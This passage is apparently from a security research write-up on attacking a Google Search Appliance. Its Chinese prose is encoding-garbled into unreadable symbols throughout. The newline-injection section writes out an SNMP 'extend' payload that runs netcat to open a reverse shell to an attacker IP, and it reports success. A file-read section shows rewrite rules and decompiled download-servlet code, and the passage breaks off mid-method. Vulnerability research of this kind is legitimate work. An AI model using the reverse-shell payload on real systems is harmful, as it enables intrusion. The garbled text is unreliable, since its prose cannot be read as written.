&lt;p&gt;Ê≠§ÊñπÂºèËºÉÁÇ∫Á∞°ÂñÆÂèØË°å„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÁÆ°ÁêÜ‰ªãÈù¢ÊèõË°åÂ≠óÂÖÉÊèíÂÖ•&quot;&gt;ÁÆ°ÁêÜ‰ªãÈù¢ÊèõË°åÂ≠óÂÖÉÊèíÂÖ•&lt;/h4&gt;

&lt;p&gt;ÁôªÂÖ•ÁÆ°ÁêÜ‰ªãÈù¢ÂæåÔºåËßÄÂØüÂà∞ÂÖ∂‰∏≠Êúâ SNMP ÂèñÂæóÁ≥ªÁµ±Ë≥áË®äÁöÑÂäüËÉΩÔºå
‰∏îÊ≠§ÂäüËÉΩÂèØ‰ª•ÊèíÂÖ•Ëá™ÂÆöÁæ©Â≠ó‰∏≤Ôºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÂòóË©¶Á∂ìÂÖ∏ÁöÑÊèõË°åÊ≥®ÂÖ•Ôºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Â∞á sysContact ÊèíÂÖ•&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊèíÂÖ• extend Ë®≠ÂÆöÂÄº‰πãÂæåÔºåÂ∞±ÂèØ‰ª•Áî® snmpwalk Ëß∏Áôº SNMP ÁöÑextend ÂäüËÉΩÔºå
‰∏¶Âü∑Ë°å shell„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàêÂäüÂü∑Ë°åÊåá‰ª§‰∏¶ÂèçÈÄ£„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;‰ªªÊÑèËÆÄÊ™î&quot;&gt;‰ªªÊÑèËÆÄÊ™î&lt;/h4&gt;

&lt;p&gt;Êñº GSA 6.x Á≥ªÂàóÁâàÊú¨ÂæåÁöÑ RPM ÂÆâË£ùÂåÖ‰∏≠ÁôºÁèæÂÖ∂ 80/443 ÁöÑÁ∂≤È†ÅÊúçÂãô‰ΩøÁî® Apache httpdÔºå
ÂÖ∂‰∏≠‰ΩçÊñº /etc/httpd/conf.d/ ‰∏≠ÊúâË®±Â§öÁöÑË®≠ÂÆö„ÄÇ
ËÄåÂÖ∂‰∏≠ gsa-http.conf Âèä gsa-https.conf ÂèØ‰ª•ÁôºÁèæÊüê‰∫õÁõÆÈåÑÊúÉË¢´Â∞éÂêëËá≥Êú¨Ê©üÁâπÂÆöÁöÑÊúçÂãôÔºö&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  RewriteEngine on
  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
  RewriteRule ^/d‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà/(.*) http://localhost:7890/dps/d‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà/$1 [P,L]
  RewriteRule ^/s‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà/(.*) http://localhost:7890/dps/s‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà/$1 [P,L]
  RewriteRule ^/v‚ñà‚ñà‚ñà‚ñà‚ñà/(.*) http://localhost:7890/v‚ñà‚ñà‚ñà‚ñà‚ñà/$1 [P,L]
  RewriteRule ^/$ http://localhost:7800/ [P,L]
  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂÖ∂‰∏≠ÈÄöË®äÂü†ÁÇ∫ 7886 Ë∑ü 7890 ÁöÑÊúçÂãôÁÇ∫Âè¶Â§ñÂü∑Ë°åÁöÑ Apache Tomcat ‰º∫ÊúçÂô®ÔºåÁï∂‰∏≤Êé•ÂÖ©Â±§‰ª•‰∏äÁöÑÁ∂≤Á´ô‰º∫ÊúçÂô®ÊôÇÔºå
Tomcat ÁöÑË∑ØÂæëÂà§Êñ∑ ..;/ ÊòØ‰∏ÄÂÄãÊúâË∂£ÁöÑÊ∏¨Ë©¶ÈªûÔºåÂèØ‰ª•ÂèÉÈñ±‰∏Ä‰ΩçËÄÅÂâçËº©ÁöÑÊñáÁ´†Ôºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÊàëÂÄëÊúâËààË∂£ÁöÑÈªûÁÇ∫ dps ÔºåÈÄô‰ºº‰πéÊ≤íÊúâÂú®ËàäÁâàÁöÑ GSA ‰∏≠ÁúãÂà∞„ÄÇ
Âæû dps.war ‰∏≠Ëß£Âá∫ /WEB-INF/web.xml ËßÄÂØüÁ∂≤È†ÅÊáâÁî®ÈÖçÁΩÆÔºå‰∏¶ÁôºÁèæ /font ÊúÉÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;rootDirectory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;work/fonts/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/font/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Êé•ËëóÊü•Áúã DPSDownloadServletÔºö&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.documill.dps.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.servlet.ServletContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSDownloadServlet&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DownloadServlet&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSUserService&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DPSDownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRealPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servletcontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;DPS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getHomeDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FileNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DPSDownloadServlet:getRealPath:DPS home directory not specified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÁôºÁèæÊ≠§È°ûÂà•ÊòØÁπºÊâøËá™ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/code&gt;ÔºåË∑üÈÄ≤Ê≠§È°ûÂà•Ôºö&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uriParameterName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid file path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deriveFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unreadable file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;File too big:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTypeFromPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/octet-stream&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastModified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expires&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cache-Control&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;public&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
